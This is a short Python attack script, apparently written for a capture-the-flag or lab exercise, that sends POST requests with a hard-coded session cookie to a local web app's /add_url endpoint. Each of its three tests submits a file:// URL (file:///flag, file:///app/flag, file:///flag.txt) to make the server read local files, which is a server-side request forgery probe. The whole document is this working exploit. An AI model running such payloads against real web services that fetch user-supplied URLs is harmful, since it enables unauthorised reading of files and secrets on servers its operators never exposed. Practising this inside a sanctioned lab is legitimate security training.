import urllib.request
import urllib.parse

url = "http://127.0.0.1:5003/add_url"
cookie = "session=eyJfZnJlc2giOmZhbHNlfQ.aVpTCA.s-VGf6vmfbtBjEeQRdAqLSxxbxE"

# Test 1: file:///flag
print("[+] Testing: file:///flag")
data = urllib.parse.urlencode({'url': 'file:///flag'}).encode()
req = urllib.request.Request(url, data=data)
req.add_header('Cookie', cookie)

try:
    with urllib.request.urlopen(req, timeout=5) as response:
        body = response.read().decode()
        print(f"Status: {response.status}")
        print(f"Response: {body}\n")
except Exception as e:
    print(f"Error: {e}\n")

# Test 2: file:///app/flag
print("[+] Testing: file:///app/flag")
data = urllib.parse.urlencode({'url': 'file:///app/flag'}).encode()
req = urllib.request.Request(url, data=data)
req.add_header('Cookie', cookie)

try:
    with urllib.request.urlopen(req, timeout=5) as response:
        body = response.read().decode()
        print(f"Status: {response.status}")
        print(f"Response: {body}\n")
except Exception as e:
    print(f"Error: {e}\n")

# Test 3: file:///flag.txt
print("[+] Testing: file:///flag.txt")
data = urllib.parse.urlencode({'url': 'file:///flag.txt'}).encode()
req = urllib.request.Request(url, data=data)
req.add_header('Cookie', cookie)

try:
    with urllib.request.urlopen(req, timeout=5) as response:
        body = response.read().decode()
        print(f"Status: {response.status}")
        print(f"Response: {body}")
except Exception as e:
    print(f"Error: {e}")

